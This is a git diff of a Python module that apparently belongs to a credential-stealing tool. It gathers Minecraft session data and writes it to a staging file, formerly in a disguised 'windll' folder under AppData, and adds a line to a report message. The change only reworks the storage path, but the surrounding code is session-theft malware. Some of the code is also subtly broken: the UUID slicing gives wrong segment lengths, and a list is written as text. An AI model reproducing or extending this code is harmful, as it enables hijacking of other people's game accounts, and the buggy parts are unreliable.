@@ -11,8 +11,9 @@
 #-----------------------------------------------------------------------------#
 
 from json import loads
-from os import getenv,makedirs,sep,environ
+from os import getenv,makedirs,environ
 from manager.logger import Log
+from preferences.config import config
 
 def uuid_dashed(uuid):
     return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
@@ -35,10 +36,11 @@ def Minecraft():
                         ]
                 }
                 logs.append(log)
-                pathf = environ['USERPROFILE'] + sep + r'AppData\Local'
+                user = environ['USERPROFILE']
+                pathtofile = f'{user}\\{config.pathToLogs}'
                 try:
-                    makedirs(rf'{pathf}\windll\Games\Minecraft')
-                    with open(rf'{pathf}\windll\Games\Minecraft\session.txt',"w") as file:
+                    makedirs(f'{pathtofile}\\Games\\\Minecraft')
+                    with open(f'{pathtofile}\\Games\\Minecraft\\session.txt',"w") as file:
                         file.write(logs)
                     msgInfo+="\n∟🎮Minecraft"
                     return msgInfo
